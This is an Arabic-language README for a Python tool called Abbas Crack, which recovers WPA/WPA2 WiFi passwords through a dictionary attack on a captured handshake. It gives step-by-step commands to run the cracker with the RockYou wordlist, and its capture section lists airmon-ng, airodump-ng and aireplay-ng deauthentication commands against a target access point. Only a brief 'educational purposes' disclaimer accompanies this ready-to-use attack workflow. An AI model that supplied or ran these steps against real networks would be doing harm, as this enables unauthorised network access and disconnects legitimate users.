<div align="center">

# 🔓 Abbas Crack v1.1

### كاسر Handshake لشبكات WiFi — بدون Scapy

![Python](https://img.shields.io/badge/Python-3.7%2B-blue?style=flat-square&logo=python)
![Platform](https://img.shields.io/badge/Platform-Termux%20%7C%20Linux%20%7C%20Windows-green?style=flat-square)
![Made In](https://img.shields.io/badge/Made%20in-Iraq%20🇮🇶-orange?style=flat-square)

</div>

---

## 👨‍💻 عن المبرمج

<div align="center">

### **جنرال عباس**

🇮🇶 **العراق**

*مطوّر أدوات أمنية واختبار اختراق*

**صُنع في العراق بـ ❤️**

</div>

---

## 📖 عن الأداة

**Abbas Crack** أداة بلغة Python تكسر كلمة سر شبكات WiFi (WPA/WPA2) عن طريق **هجوم القاموس (Dictionary Attack)** على ملف Handshake محفوظ بصيغة `.pcap` أو `.cap`.

مكتوبة **بدون Scapy** → تشتغل على Termux بدون root وبدون `pip install`.

---

## 🧠 شرح مبسط — كيف تشتغل؟

### أول شي: شنو هو Handshake؟
هو **مصافحة** تصير بين جهازك والراوتر وقت الاتصال، تتكون من 4 رسائل:

```
STA (جهازك)                    AP (الراوتر)
     |                              |
     |──────  M1  ─────────────────>|   ← الراوتر يرسل رقم عشوائي (ANonce)
     |                              |
     |<─────  M2  ──────────────────|   ← الجهاز يرد برقم عشوائي (SNonce) + بصمة (MIC)
     |                              |
     |──────  M3  ─────────────────>|
     |                              |
     |<─────  M4  ──────────────────|
```

### شنو يسوي السكربت؟
1. **يقرأ** ملف الهانشيك (`.pcap`)
2. **يستخرج** SSID (اسم الشبكة) + M1 + M2
3. **يجرب** كل كلمة من ملف الكلمات:
   ```
   يحسب: PMK من (الكلمة + SSID)
   يحسب: PTK من PMK + أرقام عشوائية
   يحسب: MIC ويقارنه مع الموجود بالملف
   ```
4. **إذا تطابق** → ✅ كلمة السر صح
5. **إذا لا** → يجرب الكلمة التالية

**باختصار:** يجرب كلمة كلمة من قائمة جاهزة لحد ما يلكه الصحيحة.

---

## 🛠️ التثبيت

**على Termux:**
```bash
pkg install python git -y
git clone https://github.com/USERNAME/abbas-crack.git
cd abbas-crack
```

**على Linux / Windows:**
```bash
git clone https://github.com/USERNAME/abbas-crack.git
cd abbas-crack
```

---

## 🚀 طريقة التشغيل

### الصيغة:
```bash
python3 abbas_crack.py <ملف_الهانشيك> <ملف_الكلمات>
```

### أمثلة:

**1) تشغيل عادي:**
```bash
python3 abbas_crack.py wifi.cap rockyou.txt
```

**2) تحديد عدد المعالجات (أسرع):**
```bash
python3 abbas_crack.py wifi.cap rockyou.txt -j 4
```

**3) وضع المعالج الواحد (إذا صار مشكل):**
```bash
python3 abbas_crack.py wifi.cap rockyou.txt --single
```

**4) عرض المساعدة:**
```bash
python3 abbas_crack.py --help
```

---

## 📋 الخيارات

| الخيار | الوصف |
|--------|-------|
| `handshake` | مسار ملف الهانشيك (`.pcap` / `.cap`) |
| `wordlist` | مسار قائمة الكلمات (`.txt`) |
| `-j N` | عدد المعالجات المستخدمة |
| `--single` | تعطيل Multi-Processing |

---

## 🎯 مثال على النتيجة

```bash
$ python3 abbas_crack.py wifi.cap rockyou.txt

[*] قراءة الملف: wifi.cap
[+] عدد الحزم: 1543
[+] SSID: MyNetwork
[+] AP MAC: a4:2b:b0:12:34:56
[+] الكلمات: 14,344,391
[+] المعالجات: 7

[████████████░░░░░░░░░░] 42% | 6M/14M | 18K H/s

╔═══════════════════════════════════╗
║  ✅ كلمة السر: mypassword123
╚═══════════════════════════════════╝
⏱️ الوقت: 332.7s
📊 حاولنا: 6,067,881
```

---

## 📱 كيف تجيب ملف الهانشيك؟

باستخدام **aircrack-ng** على Termux (يحتاج root):

```bash
pkg install root-repo aircrack-ng -y

su -c "airmon-ng start wlan0"
su -c "airodump-ng wlan0mon"
su -c "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"
su -c "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon"
```

الملف الناتج: **`capture-01.cap`** ← استخدمه مع الأداة

---

## 🎁 من وين تجيب Wordlist؟

- **RockYou** (14 مليون كلمة) → [تنزيل](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- **SecLists** → [GitHub](https://github.com/danielmiessler/SecLists)

---

## 🐛 حل المشاكل

| المشكلة | الحل |
|---------|------|
| `ليس pcap صالح` | الملف تالف — أعد التسجيل |
| `Handshake غير مكتمل` | ما موجود M1/M2 — أعد الالتقاط |
| بطيء | جرّب `-j` أكثر أو wordlist أصغر |
| `multiprocessing فشل` | استخدم `--single` |

---

## ⚠️ تنبيه مهم

> هذه الأداة **لأغراض تعليمية فقط**.
> استخدامها على شبكات ما تملكها = **جريمة**.
> المبرمج **غير مسؤول** عن أي استخدام غير قانوني.

---

<div align="center">

**⚡ Abbas Crack v1.1 — بدون Scapy · بدون تعقيد ⚡**

**جنرال عباس 🇮🇶**

</div>
